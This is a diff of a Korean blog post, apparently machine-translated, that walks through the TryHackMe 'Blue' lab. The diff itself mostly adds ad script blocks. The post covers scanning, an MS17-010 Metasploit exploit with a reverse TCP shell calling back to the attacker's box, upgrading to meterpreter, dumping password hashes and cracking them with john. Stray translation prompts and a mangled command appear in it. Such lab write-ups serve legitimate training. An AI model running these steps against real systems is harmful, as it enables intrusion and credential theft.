@@ -3,17 +3,13 @@ title: "TryHackMe  Blue 네트워크 침투 테스트 배우기"
 description: ""
 coverImage: "/assets/img/2024-06-23-TryHackMeBlue_0.png"
 date: 2024-06-23 15:53
-ogImage: 
+ogImage:
   url: /assets/img/2024-06-23-TryHackMeBlue_0.png
 tag: Tech
 originalTitle: "TryHackMe — Blue"
 link: "https://medium.com/@hackshobgoblin/tryhackme-blue-6e62789bad02"
 isUpdated: true
 ---
-
-
-
-
 
 방 정보: https://tryhackme.com/r/room/blue
 
@@ -23,7 +19,18 @@ isUpdated: true
 
 아래의 질문에 답해주세요:
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 기계를 스캔해보세요.
 
@@ -39,7 +46,18 @@ nmap -sVC -T4 -p- --open 10.10.66.134 -oN blue.nmap
 - 열려 있는 포트만 표시하기 위한 -- open
 - 결과를 nmap 형식으로 출력하기 위한 -oN
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 포트 번호가 1000 미만인 오픈 포트가 몇 개나 있나요? 3개입니다.
 
@@ -52,7 +70,18 @@ nmap -p 135,139,445 --script=vuln 10.10.66.134
 - -p 옵션은 스캔할 포트를 설정하는데, 포트를 입력할 때는 콤마로 구분합니다.
 - --script=vuln은 지정한 포트에 대해 기본 취약성 스캔을 실행합니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 <img src="/assets/img/2024-06-23-TryHackMeBlue_1.png" />
 
@@ -62,19 +91,41 @@ nmap -p 135,139,445 --script=vuln 10.10.66.134
 
 해당 머신을 공격하여 발판을 만듭니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 메타스플로잇을 시작해주세요.
 
 ```js
-msfconsole -q
+msfconsole - q;
 ```
 
 기계에 대해 실행할 악용 코드를 찾아보세요. 코드의 전체 경로는 무엇인가요? (예: exploit/......)
 
 우리는 취약점에 적합한 악용 코드를 찾기 위해 다음 명령을 실행할 것입니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 ```js
 search ms17-010
@@ -86,8 +137,18 @@ search ms17-010
 
 알겠어요. 원하는 업적을 선택하기 위해 다음 명령을 실행하면 됩니다:
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
 
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 사용 0
 
@@ -97,8 +158,18 @@ search ms17-010
 
 그럼 이제 선택한 모듈로 Metasploit은 자동으로 페이로드를 선택합니다. 이 경우, windows/x64/meterpreter/reverse_tcp를 선택합니다. 우리는 windows/x64/shell/reverse_tcp를 사용하여 미터프리터 셸로 업그레이드 할 것입니다.
 
+<!-- cozy-coder - 수평 -->
 
-<div class="content-ad"></div>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 자, payload를 설명해 드리겠습니다. 이것은 x64 아키텍처를 사용하는 Windows 기기를 위한 payload로, 기본 Windows 셸을 이용한 역방향 tcp 셸입니다. 역쉘은 우리 기기에 리스너를 설정하고 대상으로부터 연결을 받을 때 얻는 것으로, 이를 통해 해당 기기에서 명령을 실행할 수 있게 됩니다.
 
@@ -110,13 +181,22 @@ search ms17-010
 
 이를 실행하여 설정할 수 있습니다:
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
 
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 set rhosts [피해자 IP]
 set lhost [tun0 IP 또는 공격 상자 IP]
 set payload windows/x64/shell/reverse_tcp
-
 
 위 단계를 마치면 옵션을 실행하여 설정한 모든 옵션을 확인하여 올바른지 확인할 수 있습니다.
 
@@ -124,8 +204,18 @@ set payload windows/x64/shell/reverse_tcp
 
 또한 언급을 잊은 더 하나의 옵션을 설정할 수 있습니다. 그것은 목표입니다.
 
+<!-- cozy-coder - 수평 -->
 
-<div class="content-ad"></div>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 피해자 기기의 운영 체제를 알고 있기 때문에 다음 명령을 실행할 수 있습니다:
 
@@ -138,7 +228,18 @@ set target 1
 
 여기에는 취약점에 대한 사용 가능한 대상이 표시되며, 우리가 원하는 대상을 설정합니다. 이 경우 Windows 7입니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 그럼 이제 우리가 해야 할 일은 목표에 대한 공격을 실행하기 위해 "run" 또는 "exploit" 명령을 실행하는 것입니다.
 
@@ -148,7 +249,18 @@ set target 1
 
 작업 3 승격
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 권한을 높이고, Metasploit에서 쉘을 업그레이드하는 방법을 배워봅시다.
 
@@ -160,7 +272,18 @@ set target 1
 search shell_to_meterpreter
 ```
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 `post/multi/manage/shell_to_meterpreter` 모듈의 전체 경로입니다.
 
@@ -168,12 +291,33 @@ search shell_to_meterpreter
 
 이후, 올바른 세션 ID를 설정하면 됩니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 위 표를 Markdown 형식으로 변경해주세요.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
 
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 ```js
 세션이 설정되었습니다: 1
@@ -185,20 +329,39 @@ search shell_to_meterpreter
 
 우리는 성공적으로 쉘을 미터프리터 쉘로 업그레이드했지만 자동으로 백그라운드로 이동되었는 것으로 보입니다. 따라서 다시 한 번 세션 목록을 보고, 세션 2를 실행하여 세션 2로 이동해야 합니다. 이것이 바로 우리의 미터프리터 세션입니다.
 
+<!-- cozy-coder - 수평 -->
 
-<div class="content-ad"></div>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 getuid을 실행하면 여전히 NT AUTHORITY\SYSTEM 컨텍스트에서 명령을 실행 중이라는 것을 확인할 수 있습니다.
 
-
 ![이미지](/assets/img/2024-06-23-TryHackMeBlue_10.png)
-
 
 'ps' 명령을 사용하여 실행 중인 모든 프로세스를 나열하세요. 우리가 시스템이라고 해서 우리의 프로세스가 항상 시스템일 필요는 없습니다. 이 목록 맨 아래에 NT AUTHORITY\SYSTEM으로 실행되는 프로세스를 찾아서 해당 프로세스 ID(왼쪽 열)를 적어두세요.
 
 "getpid" 명령을 실행하면 현재 실행 중인 프로세스 ID를 확인할 수 있습니다. 그런 다음 해당 프로세스 ID에 연결된 프로세스가 무엇인지 확인하기 위해 다시 ps를 실행할 수 있습니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 이미지 태그를 Markdown 형식으로 변경해주세요.
 
@@ -210,7 +373,18 @@ getuid을 실행하면 여전히 NT AUTHORITY\SYSTEM 컨텍스트에서 명령�
 
 기본 사용자가 아닌 사용자의 암호를 덤프하고 크래킹해보세요!
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 우리의 고급 meterpreter 쉘 안에서 'hashdump' 명령을 실행해주세요. 이렇게 하면 올바른 권한이 있을 때 기계의 모든 비밀번호가 덤프됩니다. 기본 사용자가 아닌 사용자의 이름은 무엇인가요?
 
@@ -220,7 +394,18 @@ getuid을 실행하면 여전히 NT AUTHORITY\SYSTEM 컨텍스트에서 명령�
 
 이 비밀번호 해시를 파일로 복사하고 이를 해독하는 방법에 대해 조사해보세요. 해독된 비밀번호는 무엇인가요?
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 이 해시를 처리하려면 해시 (마지막 “:” 이후의 해시 부분 만 필요합니다)를 "hash.txt"라는 파일에 즐겨 사용하는 텍스트 편집기를 통해 추가 한 후 다음 명령을 사용하여 john을 사용하여 해시를 해독 할 수 있습니다.
 
@@ -233,7 +418,18 @@ john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
 
 그럼 그 명령을 실행하면 Jon 사용자의 비밀번호를 얻게 될 것입니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 태스크 5 깃발 찾기!
 
@@ -243,9 +439,20 @@ john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
 
 깃발2? 이 깃발은 Windows 내에서 비밀번호가 저장되는 위치에서 찾을 수 있습니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
 
-*오류: Windows는이 깃발의 위치를 싫어하고 때때로 삭제할 수 있습니다. 이 깃발을 찾으려면 몇 가지 경우에는 컴퓨터를 종료/다시 시작하고 공격을 다시 실행해야 할 수도 있습니다. 그러나 상대적으로 드물게 발생할 수 있습니다.
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+\*오류: Windows는이 깃발의 위치를 싫어하고 때때로 삭제할 수 있습니다. 이 깃발을 찾으려면 몇 가지 경우에는 컴퓨터를 종료/다시 시작하고 공격을 다시 실행해야 할 수도 있습니다. 그러나 상대적으로 드물게 발생할 수 있습니다.
 
 flag3? 이 깃발은 루팅하기에 훌륭한 위치에 있을 수 있습니다. 왜냐하면 일반적으로 관리자들은 흥미로운 것들을 많이 저장하기 때문입니다.
 
@@ -255,6 +462,17 @@ flag3? 이 깃발은 루팅하기에 훌륭한 위치에 있을 수 있습니다
 type [깃발.txt의 이름]
 ```
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 읽어주셔서 감사합니다 😊
